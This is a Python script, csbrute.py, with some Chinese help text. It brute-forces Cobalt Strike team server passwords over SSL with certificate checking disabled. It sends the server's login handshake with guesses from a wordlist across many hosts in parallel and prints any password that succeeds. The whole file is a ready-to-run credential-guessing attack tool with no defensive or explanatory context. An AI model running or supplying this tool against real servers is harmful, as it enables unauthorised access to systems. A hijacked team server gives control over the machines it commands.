#!/usr/bin/env python3

import time
import socket
import ssl
import argparse
import concurrent.futures
import sys
import os

# csbrute.py - Cobalt Strike Team Server Password Brute Forcer

# https://stackoverflow.com/questions/6224736/how-to-write-python-code-that-is-able-to-properly-require-a-minimal-python-versi

MIN_PYTHON = (3, 3)
if sys.version_info < MIN_PYTHON:
    sys.exit("Python %s.%s or later is required.\n" % MIN_PYTHON)

parser = argparse.ArgumentParser()

parser.add_argument("host",
                    help="IP:PORT/文件")
parser.add_argument("wordlist", 
                    help="字典文件")
# parser.add_argument("-p", dest="port", default=50050, type=int,
#                     help="Teamserver port")
parser.add_argument("-t", dest="threads", default=25, type=int,
                    help="线程数量")

args = parser.parse_args()

# https://stackoverflow.com/questions/27679890/how-to-handle-ssl-connections-in-raw-python-socket


class NotConnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class DisconnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class Connector:
    def __init__(self):
        self.sock = None
        self.ssl_sock = None
        self.ctx = ssl.SSLContext()
        self.ctx.verify_mode = ssl.CERT_NONE
        pass

    def is_connected(self):
        return self.sock and self.ssl_sock

    def open(self, hostname, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.ssl_sock = self.ctx.wrap_socket(self.sock)

        if hostname == socket.gethostname():
            ipaddress = socket.gethostbyname_ex(hostname)[2][0]
            self.ssl_sock.connect((ipaddress, port))
        else:
            self.ssl_sock.connect((hostname, port))

    def close(self):
        if self.sock:
            self.sock.close()
        self.sock = None
        self.ssl_sock = None

    def send(self, buffer):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        self.ssl_sock.sendall(buffer)

    def receive(self):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        received_size = 0
        data_buffer = b""

        while received_size < 4:
            data_in = self.ssl_sock.recv()
            data_buffer = data_buffer + data_in
            received_size += len(data_in)

        return data_buffer

# 连接成功但密码失败
attempts = 0
# 连接失败
failures = 0

urls = []
passwords = []

if args.wordlist:
    passwords = open(args.wordlist).read().split("\n")
else:
    parser.print_help()

if args.host:
    if os.path.exists(args.host):
        urls = open(args.host).read().split("\n")
    else:
        urls.append(args.host)
else:
    parser.print_help()

def passwordcheck(host_port):
    if len(passwords) > 0:
        num = 0
        for password in passwords:
            if password.strip() != "":
                result = None
                conn = Connector()
                host = host_port.split(":")[0]
                port = host_port.split(":")[1]
                conn.open(host, int(port))
                payload = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(
                    bytes(password, "ascii").ljust(256, b"A"))
                conn.send(payload)
                if conn.is_connected(): result = conn.receive()
                if conn.is_connected(): conn.close()
                
                if result == bytearray(b"\x00\x00\xca\xfe"):
                    # print(host+":"+port+" "+password)
                    return password
                else:
                    continue
                num +=1
                print(num) 
    else:
        print("Ignored blank password")



if len(passwords) > 0:

    # print("Word Count: {}".format(len(passwords)))
    # print("Threads: {}".format(args.threads))

    start = time.time()

    # https://stackoverflow.com/questions/2846653/how-to-use-threading-in-python

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        # print(urls)
        future_to_check = {executor.submit(passwordcheck, host_port): host_port for host_port in urls}
        # print(future_to_check)
        for future in concurrent.futures.as_completed(future_to_check):
            host_and_port = future_to_check[future]
            
            try:
                data = future.result()
                attempts = attempts + 1
                # print(password)
                if data:
                    print("[SUCCESS] "+future_to_check[future]+" "+data)
                    # print("Found Password: {}".format(data))
            except Exception as exc:
                failures = failures + 1
                print('%r generated an exception: %s' % (host_and_port, exc))

    print("Attempts: {}".format(attempts))
    print("Failures: {}".format(failures))
    finish = time.time()
    print("Seconds: {:.1f}".format(finish - start))
    # print("Attemps per second: {:.1f}".format((failures + attempts) / (finish - start)))
else:
    print("Password(s) required")